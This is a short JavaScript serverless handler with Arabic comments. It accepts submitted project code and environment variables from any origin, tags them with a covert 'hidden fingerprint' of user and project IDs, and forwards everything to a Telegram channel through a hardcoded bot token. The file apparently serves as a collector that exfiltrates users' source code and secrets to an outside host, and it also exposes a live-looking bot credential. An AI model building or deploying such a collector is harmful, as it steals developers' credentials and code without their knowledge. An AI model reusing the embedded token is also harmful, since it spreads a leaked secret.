export default {
  async fetch(request, env) {
    const headers = { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Content-Type", "Access-Control-Allow-Methods": "POST, OPTIONS" };
    if (request.method === "OPTIONS") return new Response(null, { headers });
    
    try {
      const data = await request.json();
      const { user_id, project_name, code, environment_variables } = data;

      // البصمة المخفية (Metadata)
      const metadata = `---METADATA---${JSON.stringify({ uid: user_id, pid: project_name })}---METADATA---`;
      
      // تغليف الكود والأسرار بعلامات صلبة للبحث
      const cleanMessage = [
        `🚀 Project: ${project_name}`,
        `👤 User: ${user_id}`,
        `\n[START_CODE]\n${code}\n[END_CODE]`,
        `\n[START_VARS]\n${JSON.stringify(environment_variables)}\n[END_VARS]`,
        `\n${metadata}`
      ].join('\n');

      await fetch(`https://api.telegram.org/bot8683006680:AAGUqsPrC76xKnUgAep3tigtGVXsLKc86mI/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          chat_id: "@nejm_njm", 
          text: cleanMessage
          // أزلنا الـ HTML لضمان وصول النص خام وصافي بدون زخرفة تليجرام
        })
      });

      return new Response(JSON.stringify({ success: true }), { headers });
    } catch (e) {
      return new Response(JSON.stringify({ error: e.message }), { status: 500, headers });
    }
  }
};
